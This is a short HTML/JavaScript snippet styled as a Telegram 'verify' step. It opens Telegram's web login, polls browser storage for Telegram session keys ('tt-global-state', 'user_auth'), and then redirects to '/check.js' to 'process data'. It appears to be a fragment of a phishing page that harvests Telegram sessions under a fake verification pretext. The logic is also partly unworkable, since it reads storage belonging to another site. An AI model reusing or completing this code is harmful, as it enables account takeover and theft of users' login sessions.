<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
  function verify() {
    // Request Telegram login using WebApp API
    Telegram.WebApp.ready();
    Telegram.WebApp.openLink('https://web.telegram.org/k/'); // Opens Telegram login

    // Poll for login state and proceed when ready
    const checkLoginInterval = setInterval(() => {
      const globalState = localStorage.getItem("tt-global-state");
      if (globalState && localStorage.getItem("user_auth")) {
        clearInterval(checkLoginInterval);
        window.location.href = "/check.js"; // Proceed to process data
      }
    }, 1000); // Check every second
  }
</script>
